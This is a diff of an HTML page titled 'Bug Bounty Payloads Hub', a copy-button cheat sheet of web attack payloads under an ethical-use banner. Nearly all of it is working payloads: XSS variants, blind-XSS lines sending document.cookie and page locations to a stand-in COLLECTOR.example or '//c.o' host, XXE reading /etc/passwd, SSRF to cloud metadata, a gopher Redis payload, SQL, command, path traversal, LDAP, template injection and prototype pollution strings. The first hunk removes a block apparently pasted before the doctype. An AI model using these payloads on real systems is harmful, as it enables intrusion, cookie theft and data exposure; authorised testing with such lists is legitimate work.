@@ -1,74 +1,4 @@
-    <div class="container">
-        <div class="warning">
-            <h3>⚠️ ETHICAL USAGE ONLY ⚠️</h3>
-            <p>These payloads are for authorized security testing and educational purposes only. Use responsibly and only on systems you own or have explicit permission to test.</p>
-        </div>
-
-<!-- XXE Payloads -->
-            <div class="payload-card" data-category="xxe">
-                <div class="card-header">
-                    <span class="card-icon">📄</span>
-                    <h3 class="card-title">XXE Payloads</h3>
-                </div>
-                <div class="payload-list">
-                    <div class="payload-item">
-                        &lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;root&gt;&amp;test;&lt;/root&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Header Injection (Blind XSS) -->
-            <div class="payload-card" data-category="header-injection">
-                <div class="card-header">
-                    <span class="card-icon">📡</span>
-                    <h3 class="card-title">Header Injection (Blind XSS)</h3>
-                </div>
-                <div class="payload-list">
-                    <div class="payload-item">
-                        curl -H "User-Agent: &lt;/script&gt;&lt;img src=x onerror=\"this.src='https://COLLECTOR.example/bxss?h=ua&u='+encodeURIComponent(location)\"&gt;" https://target.tld/
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        curl -H "Referer: '&gt;&lt;/script&gt;&lt;svg onload=\"new Image().src('https://COLLECTOR.example/bxss?h=ref&u='+encodeURIComponent(location))\"&gt;&lt;/svg&gt;" https://target.tld/
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        curl -H "X-Forwarded-For: \" autofocus onfocus=\"new Image().src('https://COLLECTOR.example/bxss?h=xff&u='+encodeURIComponent(location))\" x=\"" https://target.tld/
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- File Upload XSS -->
-            <div class="payload-card" data-category="file-upload">
-                <div class="card-header">
-                    <span class="card-icon">📁</span>
-                    <h3 class="card-title">File Upload XSS</h3>
-                </div>
-                <div class="payload-list">
-                    <div class="payload-item">
-                        "'&gt;&lt;img src=x onerror="this.src='https://COLLECTOR.example/bxss?f=name'" &gt;.png
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        "&gt;&lt;img src=x onerror=alert('stored')&gt;.png
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;?xml version="1.0" standalone="no"?&gt;&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;animate attributeName="x" dur="1s" from="0" to="1" onbegin="new Image().src('https://COLLECTOR.example/bxss?f=svg')"/&gt;&lt;/svg&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Markdown/WYSIWYG XSS -->
-            <div class="payload-card" data-category="markdown-xss">
-                <div<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -83,7 +13,8 @@
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
+            /* FIX: Changed gradient to solid black for a seamless scroll effect */
+            background-color: #000;
             color: #00ff41;
             min-height: 100vh;
             overflow-x: hidden;
@@ -228,6 +159,7 @@
             position: relative;
             cursor: pointer;
             transition: all 0.3s ease;
+            word-wrap: break-word;
         }
 
         .payload-item:hover {
@@ -309,13 +241,18 @@
         <h1>⚡ Bug Bounty Payloads Hub ⚡</h1>
         <p>Your Ultimate Collection of Security Testing Payloads</p>
     </header>
+    
+    <div class="container">
+        <div class="warning">
+            <h3>⚠️ ETHICAL USAGE ONLY ⚠️</h3>
+            <p>These payloads are for authorized security testing and educational purposes only. Use responsibly and only on systems you own or have explicit permission to test.</p>
+        </div>
 
         <div class="search-bar">
             <input type="text" class="search-input" id="searchInput" placeholder="Search payloads...">
         </div>
 
         <div class="grid" id="payloadGrid">
-            <!-- Reflected XSS Payloads -->
             <div class="payload-card" data-category="reflected-xss">
                 <div class="card-header">
                     <span class="card-icon">🔥</span>
@@ -334,94 +271,9 @@
                         &lt;img src=x onerror=alert(1)&gt;
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
-                    <div class="payload-item">
-                        &lt;details open ontoggle=alert(1)&gt;&lt;/details&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        %3Cscript%3Ealert(1)%3C%2Fscript%3E
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        %3Csvg%20onload%3Dalert(1)%3E%3C%2Fsvg%3E
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
                 </div>
             </div>
 
-            <!-- Reflected XSS - Attribute Context -->
-            <div class="payload-card" data-category="attribute-xss">
-                <div class="card-header">
-                    <span class="card-icon">⚡</span>
-                    <h3 class="card-title">Reflected XSS - Attribute Context</h3>
-                </div>
-                <div class="payload-list">
-                    <div class="payload-item">
-                        " autofocus onfocus=alert(1) x="
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        ' onmouseover=alert(1) x='
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                         onpointerenter=alert(1) 
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        / onanimationstart=alert(1) 
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        %22%20autofocus%20onfocus%3Dalert(1)%20x%3D%22
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        %27%20onmouseover%3Dalert(1)%20x%3D%27
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Reflected XSS - JS Context -->
-            <div class="payload-card" data-category="js-xss">
-                <div class="card-header">
-                    <span class="card-icon">💻</span>
-                    <h3 class="card-title">Reflected XSS - JavaScript Context</h3>
-                </div>
-                <div class="payload-list">
-                    <div class="payload-item">
-                        ';alert(1);//
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        ";alert(1);//
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        `);alert(1);//
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        %27%3Balert(1)%3B%2F%2F
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        %22%3Balert(1)%3B%2F%2F
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Stored XSS Payloads -->
             <div class="payload-card" data-category="stored-xss">
                 <div class="card-header">
                     <span class="card-icon">💾</span>
@@ -429,31 +281,7 @@
                 </div>
                 <div class="payload-list">
                     <div class="payload-item">
-                        &lt;script&gt;alert('stored')&lt;/script&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;svg onload=alert('stored')&gt;&lt;/svg&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
                         &lt;img src=x onerror=alert('stored')&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;marquee onstart=alert('stored')&gt;XSS&lt;/marquee&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;details open ontoggle=alert('stored')&gt;test&lt;/details&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;input autofocus onfocus=alert('stored')&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;video src=x onerror=alert('stored')&gt;&lt;/video&gt;
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
                     <div class="payload-item">
@@ -463,45 +291,6 @@
                 </div>
             </div>
 
-            <!-- DOM-based XSS -->
-            <div class="payload-card" data-category="dom-xss">
-                <div class="card-header">
-                    <span class="card-icon">🌐</span>
-                    <h3 class="card-title">DOM-based XSS</h3>
-                </div>
-                <div class="payload-list">
-                    <div class="payload-item">
-                        #&lt;img src=x onerror=alert('DOM-XSS')&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        #&lt;svg onload=alert('DOM-XSS')&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        #&lt;/script&gt;&lt;script&gt;alert('DOM-XSS')&lt;/script&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        ?q=&lt;img src=x onerror=alert('DOM-XSS')&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        ?q=';alert('DOM-XSS');//
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;iframe srcdoc="&lt;script&gt;alert('DOM-XSS')&lt;/script&gt;"&gt;&lt;/iframe&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;details open ontoggle=alert('DOM-XSS')&gt;&lt;/details&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Blind XSS -->
             <div class="payload-card" data-category="blind-xss">
                 <div class="card-header">
                     <span class="card-icon">👁️</span>
@@ -509,33 +298,16 @@
                 </div>
                 <div class="payload-list">
                     <div class="payload-item">
-                        &lt;script&gt;new Image().src='https://COLLECTOR.example/bxss?u='+encodeURIComponent(location)+'&t='+Date.now()&lt;/script&gt;
+                        &lt;script&gt;new Image().src='https://COLLECTOR.example/bxss?c='+document.cookie&lt;/script&gt;
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
                     <div class="payload-item">
-                        &lt;svg onload="new Image().src='https://COLLECTOR.example/bxss?u='+encodeURIComponent(location)+'&t='+Date.now()"&gt;&lt;/svg&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;img src=x onerror="this.src='https://COLLECTOR.example/bxss?u='+encodeURIComponent(location)+'&t='+Date.now()'"&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        "&gt;&lt;/script&gt;&lt;img src=x onerror="this.src='https://COLLECTOR.example/bxss?ctx=html&u='+encodeURIComponent(location)"&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        " autofocus onfocus="new Image().src='https://COLLECTOR.example/bxss?ctx=attr_focus&u='+encodeURIComponent(location)" x="
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        ';new Image().src('https://COLLECTOR.example/bxss?ctx=js_q&u='+encodeURIComponent(location));//
+                        "&gt;&lt;img src=x onerror="this.src='https://COLLECTOR.example/bxss?u='+encodeURIComponent(location)"&gt;
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
                 </div>
             </div>
 
-            <!-- SQL Injection -->
             <div class="payload-card" data-category="sql">
                 <div class="card-header">
                     <span class="card-icon">💉</span>
@@ -547,19 +319,7 @@
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
                     <div class="payload-item">
-                        " OR "1"="1
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
                         ' UNION SELECT NULL,NULL,NULL--
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        '; DROP TABLE users;--
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        ' OR 1=1#
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
                     <div class="payload-item">
@@ -569,7 +329,6 @@
                 </div>
             </div>
 
-            <!-- Command Injection -->
             <div class="payload-card" data-category="command">
                 <div class="card-header">
                     <span class="card-icon">💻</span>
@@ -585,25 +344,12 @@
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
                     <div class="payload-item">
-                        && ls -la
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
                         `id`
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        $(whoami)
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        ; ping -c 4 google.com
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
                 </div>
             </div>
 
-            <!-- Path Traversal -->
             <div class="payload-card" data-category="traversal">
                 <div class="card-header">
                     <span class="card-icon">📁</span>
@@ -618,208 +364,117 @@
                         ..\..\..\..\windows\system32\drivers\etc\hosts
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
+                </div>
+            </div>
+
+            <div class="payload-card" data-category="xxe">
+                <div class="card-header">
+                    <span class="card-icon">📄</span>
+                    <h3 class="card-title">XXE Payloads</h3>
+                </div>
+                <div class="payload-list">
                     <div class="payload-item">
-                        ....//....//....//etc/passwd
+                        &lt;?xml version="1.0"?&gt;&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;r&gt;&amp;xxe;&lt;/r&gt;
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
                     <div class="payload-item">
-                        %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        /var/www/../../etc/passwd
+                        &lt;?xml version="1.0"?&gt;&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM "http://INTERNAL_IP/secret"&gt;]&gt;&lt;r&gt;&amp;xxe;&lt;/r&gt;
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
                 </div>
             </div>
 
-            <!-- LDAP Injection -->
-            <div class="payload-card" data-category="ldap">
+            <div class="payload-card" data-category="header-injection">
                 <div class="card-header">
-                    <span class="card-icon">🔗</span>
-                    <h3 class="card-title">LDAP Injection</h3>
+                    <span class="card-icon">📡</span>
+                    <h3 class="card-title">Header Injection (Blind XSS)</h3>
                 </div>
                 <div class="payload-list">
                     <div class="payload-item">
-                        *)(uid=*))(|(uid=*
+                        User-Agent: &lt;img src=x onerror="this.src='//c.o/ua?l='+location"&gt;
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
                     <div class="payload-item">
-                        *)(|(password=*))
+                        Referer: '&gt;&lt;svg onload="new Image().src='//c.o/ref?c='+document.cookie"&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="payload-card" data-category="ssti">
+                <div class="card-header">
+                    <span class="card-icon">⚙️</span>
+                    <h3 class="card-title">Server-Side Template Injection</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        {{7*7}}
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
                     <div class="payload-item">
-                        )(cn=*))(|(cn=*
+                        ${7*7}
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
                     <div class="payload-item">
-                        *)(&(objectclass=*))
+                        &lt;%= 7*7 %&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                     <div class="payload-item">
+                        #{7*7}
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        *{7*7}
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="payload-card" data-category="ssrf">
+                <div class="card-header">
+                    <span class="card-icon">🔄</span>
+                    <h3 class="card-title">Server-Side Request Forgery</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        http://127.0.0.1:22
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        http://localhost/admin
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        file:///etc/passwd
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        http://169.254.169.254/latest/meta-data/
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                     <div class="payload-item">
+                        gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflusadball%0d%0a
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
                 </div>
             </div>
 
-            <!-- Event Handler Variants -->
-            <div class="payload-card" data-category="event-handlers">
+            <div class="payload-card" data-category="prototype-pollution">
                 <div class="card-header">
-                    <span class="card-icon">⚡</span>
-                    <h3 class="card-title">Event Handler Variants</h3>
+                    <span class="card-icon">☣️</span>
+                    <h3 class="card-title">Prototype Pollution</h3>
                 </div>
                 <div class="payload-list">
                     <div class="payload-item">
-                        onfocus=alert(1)
+                        ?__proto__[polluted]=true
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
                     <div class="payload-item">
-                        onclick=alert(1)
+                        {"__proto__":{"polluted":"yes"}}
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
                     <div class="payload-item">
-                        onpointerenter=alert(1)
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        onauxclick=alert(1)
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        ontoggle=alert(1)
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        onwheel=alert(1)
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        onanimationstart=alert(1)
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        ontransitionend=alert(1)
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- URL/Protocol Context -->
-            <div class="payload-card" data-category="url-protocol">
-                <div class="card-header">
-                    <span class="card-icon">🌍</span>
-                    <h3 class="card-title">URL/Protocol Context</h3>
-                </div>
-                <div class="payload-list">
-                    <div class="payload-item">
-                        &lt;a href=javascript:alert(1)&gt;click&lt;/a&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        javascript:alert(1)
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        https://target.tld/search?q=%3Csvg%20onload%3Dalert(1)%3E
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        https://target.tld/?name=%22%20autofocus%20onfocus%3Dalert(1)%20x%3D%22
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        https://target.tld/view#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Polyglot/Breakout Payloads -->
-            <div class="payload-card" data-category="polyglot">
-                <div class="card-header">
-                    <span class="card-icon">🔧</span>
-                    <h3 class="card-title">Polyglot/Breakout Payloads</h3>
-                </div>
-                <div class="payload-list">
-                    <div class="payload-item">
-                        &lt;/script&gt;&lt;svg onload=alert(1)&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        "&gt;&lt;svg onload=alert(1)&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        '&gt;&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        '&gt;&lt;script&gt;alert('stored')&lt;/script&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        "&gt;&lt;svg onload=alert('stored')&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        --&gt;&lt;/script&gt;&lt;img src=x onerror=alert('stored')&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Space/Case/Encoding Bypasses -->
-            <div class="payload-card" data-category="bypass">
-                <div class="card-header">
-                    <span class="card-icon">🚫</span>
-                    <h3 class="card-title">Filter Bypass Techniques</h3>
-                </div>
-                <div class="payload-list">
-                    <div class="payload-item">
-                        &lt;svg&lt;svg/onload=alert(1)&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &amp;lt;svg onload=alert(1)&amp;gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        %3Csvg%20onload%3D%22new%20Image().src%3D'https%3A%2F%2FCOLLECTOR.example%2Fbxss%3Fu%3D'%2BencodeURIComponent(location)%22%3E%3C%2Fsvg%3E
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Advanced XSS Payloads -->
-            <div class="payload-card" data-category="advanced-xss">
-                <div class="card-header">
-                    <span class="card-icon">🎯</span>
-                    <h3 class="card-title">Advanced XSS Techniques</h3>
-                </div>
-                <div class="payload-list">
-                    <div class="payload-item">
-                        &lt;svg&gt;&lt;animate onbegin=alert('DOM-XSS') attributeName=x dur=1s&gt;&lt;/animate&gt;&lt;/svg&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;svg&gt;&lt;animate onbegin=alert('stored') attributeName=x dur=1s repeatCount=indefinite&gt;&lt;/animate&gt;&lt;/svg&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;/title&gt;&lt;img src=x onerror=alert('DOM-XSS')&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;svg onload=console.log('XSS')&gt;&lt;/svg&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;svg onload=confirm('XSS')&gt;&lt;/svg&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;svg onload=prompt('XSS')&gt;&lt;/svg&gt;
+                        ?constructor.prototype.polluted=true
                         <button class="copy-btn" onclick="copyPayload(this)">📋</button>
                     </div>
                 </div>
@@ -913,6 +568,12 @@
         window.addEventListener('resize', function() {
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
+            // Recalculate columns and reset drops on resize to avoid visual glitches
+            const newColumns = canvas.width / font_size;
+            drops.length = 0; // Clear the old array
+            for (let x = 0; x < newColumns; x++) {
+                drops[x] = 1;
+            }
         });
     </script>
 </body>
